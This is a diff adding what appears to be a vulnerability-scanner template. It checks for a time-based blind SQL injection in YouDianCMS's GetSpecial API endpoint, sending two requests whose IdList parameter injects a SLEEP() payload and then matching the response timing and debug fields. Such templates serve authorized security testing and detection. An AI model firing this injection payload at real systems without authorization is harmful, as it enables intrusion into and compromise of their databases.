@@ -1,0 +1,52 @@
+id: poc-yaml-youdiancms-getspecial-sqli
+
+info:
+  name: YouDianCMS GetSpecial SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,9)}}"
+  t2: "{{to_number(t1)+2}}"
+  t3: "{{rand_int(1,4)}}"
+  t4: "{{to_number(t3)+2}}"
+
+http:
+  - raw:
+      - |
+        GET /index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1)+and+(SELECT+*+FROM+(SELECT(SLEEP({{t1}})))A HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration >= to_number(t1) && duration <= to_number(t2)
+      - type: dsl
+        dsl:
+          - contains(json(body, 'Data'), 'false')
+          - contains(json(body, 'Debug.ApiExecTime'), 's')
+          - contains(json(body, 'Debug.ApiUseMemory'), 'M')
+
+  - raw:
+      - |
+        GET /index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1)+and+(SELECT+*+FROM+(SELECT(SLEEP({{t3}})))A HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration >= to_number(t3) && duration <= to_number(t4)
+      - type: dsl
+        dsl:
+          - contains(json(body, 'Data'), 'false')
+          - contains(json(body, 'Debug.ApiExecTime'), 's')
+          - contains(json(body, 'Debug.ApiUseMemory'), 'M')
